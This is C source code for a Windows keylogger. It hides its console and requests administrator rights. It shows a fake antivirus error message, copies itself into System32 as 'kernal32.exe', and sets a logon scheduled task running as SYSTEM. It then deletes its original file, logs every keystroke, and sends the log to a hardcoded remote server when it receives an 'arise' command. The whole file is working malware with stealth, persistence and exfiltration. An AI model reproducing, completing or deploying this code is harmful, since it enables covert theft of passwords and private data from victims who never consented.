#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <winsock2.h>

#define SERVER_IP "192.168.1.14"  // Change this to the Linux server IP
#define SERVER_PORT 2005
#define BUF_SIZE 4096

#define LOG_FILE "log.txt"
#define REGISTRY_KEY "Software\\MyUniqueAppName\\FirstRun"

int connection = 0;
SOCKET sock;
HANDLE hMutex;
struct sockaddr_in server;

// Function prototypes
DWORD WINAPI send_logs(LPVOID lpBuffer);
void refresh_connection();
DWORD WINAPI connect_to_server(LPVOID arg);
void save_to(const char *filename, const char *message);
char map_special_shifted(int key);
void copy_to_system32();
void delete_original_executable();
int is_first_run();
void mark_as_run();
BOOL IsRunningAsAdmin();
void RelaunchAsAdmin();
void ExecuteFromSystem32();
void DeleteOriginalFile();

// Thread function to send logs to the server
DWORD WINAPI send_logs(LPVOID lpBuffer) {
    FILE *fp;
    char buffer[BUF_SIZE];
    int bytes_sent;
    SOCKET sock = *(SOCKET*)lpBuffer;

    if ((fp = fopen(LOG_FILE, "r")) == NULL) {
        printf("Error opening file\n");
        return -1;
    }
    while ((bytes_sent = fread(buffer, sizeof(char), BUF_SIZE, fp)) > 0) {
        send(sock, buffer, bytes_sent, 0);
    }
    fclose(fp);
    return 1;
}

// Function to refresh the connection to the server
void refresh_connection() {
    while (1) {
        closesocket(sock);
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(SERVER_IP);
        server.sin_port = htons(SERVER_PORT);
        int retries = 10;
        while (connect(sock, (struct sockaddr *)&server, sizeof(server))) {
            if (!retries--) continue;
            Sleep(5000); // Wait 5 seconds before trying again
        }
        return;
    }
}

// Thread function to connect to the server
DWORD WINAPI connect_to_server(LPVOID arg) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    char buffer[BUF_SIZE];
    hMutex = CreateMutex(NULL, FALSE, NULL);
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_port = htons(SERVER_PORT);

    while (1) {
        int len = recv(sock, buffer, sizeof(buffer), 0);
        if (len <= 0) {
            refresh_connection();
            continue;
        }
        buffer[len] = '\0';
        if (strcmp(buffer, "arise") == 0) {
            CreateThread(NULL, 0, send_logs, &sock, 0, NULL);
        }
    }

    closesocket(sock);
    WSACleanup();
    return 1;
}

// Function to save logs to a file
void save_to(const char *filename, const char *message) {
    WaitForSingleObject(hMutex, INFINITE);
    FILE *fp = fopen(filename, "a");
    if (fp) {
        fprintf(fp, "%s", message);
        fclose(fp);
    } else {
        printf("Error opening file: %s\n", strerror(errno));
    }
    ReleaseMutex(hMutex);
}

// Map special keys with Shift pressed
char map_special_shifted(int key) {
    switch (key) {
        case '1': return '!';
        case '2': return '@';
        case '3': return '#';
        case '4': return '$';
        case '5': return '%';
        case '6': return '^';
        case '7': return '&';
        case '8': return '*';
        case '9': return '(';
        case '0': return ')';
        case '-': return '_';
        case '=': return '+';
        case '[': return '{';
        case ']': return '}';
        case '\\': return '|';
        case ';': return ':';
        case '\'': return '"';
        case ',': return '<';
        case '.': return '>';
        case '/': return '?';
        default: return '\0';
    }
}

// Add the program to the registry for persistence

// Check if it is the first run
int is_first_run() {
    HKEY hKey;
    DWORD dwValue = 0;
    DWORD dwSize = sizeof(DWORD);

    if (RegOpenKeyEx(HKEY_CURRENT_USER, REGISTRY_KEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueEx(hKey, "IsFirstRun", NULL, NULL, (LPBYTE)&dwValue, &dwSize) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return dwValue == 1 ? 0 : 1;
        }
        RegCloseKey(hKey);
    }
    return 1;
}

#define SYSTEM32_PATH "C:\\Windows\\System32\\kernal32.exe"

BOOL IsRunningFromSystem32() {
    char path[MAX_PATH];
    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) {
        return FALSE;
    }
    return stricmp(path, SYSTEM32_PATH) == 0;
}

void CopyToSystem32AndScheduleTask() {
    char path[MAX_PATH];
    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) {
        return; // Failed to get the executable path
    }

    
    char command[MAX_PATH * 2];

    snprintf(command, sizeof(command), "copy /Y \"%s\" \"%s\"", path, SYSTEM32_PATH);
    system(command);
    snprintf(command, sizeof(command), "schtasks /create /tn System32Updater /tr C:\\Windows\\System32\\kernal32.exe /sc onlogon /RL HIGHEST /RU SYSTEM /F");
    system(command);
    DWORD processID = GetCurrentProcessId(); // Get the process ID of the running process
    snprintf(command, sizeof(command),
        "cmd.exe /c taskkill /PID %lu /F & timeout /t 1 /nobreak & del /f /q \"%s\"", 
        processID, path);

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Create a new process to execute the self-deletion
    if (CreateProcess(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}


BOOL IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    TOKEN_ELEVATION tokenElevation;
    DWORD dwSize = sizeof(TOKEN_ELEVATION);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        if (GetTokenInformation(hToken, TokenElevation, &tokenElevation, dwSize, &dwSize)) {
            isAdmin = tokenElevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    return isAdmin;
}

// Function to relaunch the program as Administrator
void RelaunchAsAdmin() {
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH); // Get the current executable path

    SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
    sei.lpVerb = "runas";      // Request "Run as Administrator"
    sei.lpFile = path;      // Path to the executable
    sei.nShow = SW_SHOWNORMAL; // Show the window normally

    if (!ShellExecuteEx(&sei)) {
        MessageBox(NULL, "Failed to elevate privileges!", "Error", MB_OK | MB_ICONERROR);
    }
}

void show_fake_popup() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    // The error message
    const char *errorMessage = "Operation did not complete successfully because the file contains a virus or potentially unwanted software.";

    // Display the message box
    MessageBox(
        NULL, // No owner window
        errorMessage, // Message body
        path, // Title of the message box
        MB_ICONERROR | MB_OK // Error icon and OK button
    );

    return;
}
int main() {
    HWND hwnd = GetConsoleWindow(); // Get the console window handle
    ShowWindow(hwnd, SW_HIDE);      // Hide the window
    if (!IsRunningFromSystem32()) {
        if(!IsRunningAsAdmin()){
            RelaunchAsAdmin();
            return 0;
        }
        show_fake_popup();
        CopyToSystem32AndScheduleTask();
        return 0;
    }

    // Start the keylogger and server connection
    CreateThread(NULL, 0, connect_to_server, NULL, 0, NULL);

    char message[1024];
    int lastKeyState[256] = {0};

    while (1) {
        for (int i = 0; i < 256; i++) {
            if (GetAsyncKeyState(i) & 0x0001) {
                // Handle keypresses and save to log file
                if (i >= 'A' && i <= 'Z') {
                    int capsLock = (GetKeyState(VK_CAPITAL) & 0x0001);
                    int shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000);

                    if (capsLock ^ shiftPressed) {
                        snprintf(message, sizeof(message), "%c", i);
                    } else {
                        snprintf(message, sizeof(message), "%c", i + 32);
                    }
                } else if (i >= '0' && i <= '9') {
                    if (GetKeyState(VK_SHIFT) & 0x8000) {
                        char shiftedChar = map_special_shifted(i);
                        if (shiftedChar != '\0') {
                            snprintf(message, sizeof(message), "%c", shiftedChar);
                        } else {
                            snprintf(message, sizeof(message), "%c", i);
                        }
                    } else {
                        snprintf(message, sizeof(message), "%c", i);
                    }
                } else if (i == VK_SPACE) {
                    strcpy(message, " ");
                } else {
                    switch (i) {
                        case VK_RETURN:  strcpy(message, " [Enter] "); break;
                        case VK_BACK:    strcpy(message, " [Backspace] "); break;
                        case VK_TAB:     strcpy(message, " [Tab] "); break;
                        case VK_ESCAPE:  strcpy(message, " [Esc] "); break;
                        case VK_SHIFT:   strcpy(message, " [Shift] "); break;
                        case VK_CONTROL: strcpy(message, " [Ctrl] "); break;
                        case VK_MENU:    strcpy(message, " [Alt] "); break;
                        case VK_CAPITAL: strcpy(message, " [CapsLock] "); break;
                        case VK_LEFT:    strcpy(message, " [Left] "); break;
                        case VK_RIGHT:   strcpy(message, " [Right] "); break;
                        case VK_UP:      strcpy(message, " [Up] "); break;
                        case VK_DOWN:    strcpy(message, " [Down] "); break;
                        case VK_HOME:    strcpy(message, " [Home] "); break;
                        case VK_END:     strcpy(message, " [End] "); break;
                        case VK_DELETE:  strcpy(message, " [Del] "); break;
                        default: snprintf(message, sizeof(message), " [Unknown: %d] ", i); break;
                    }
                }

                save_to(LOG_FILE, message);
            }
        }
        Sleep(10); // Reduce CPU usage
    }

    return 0;
}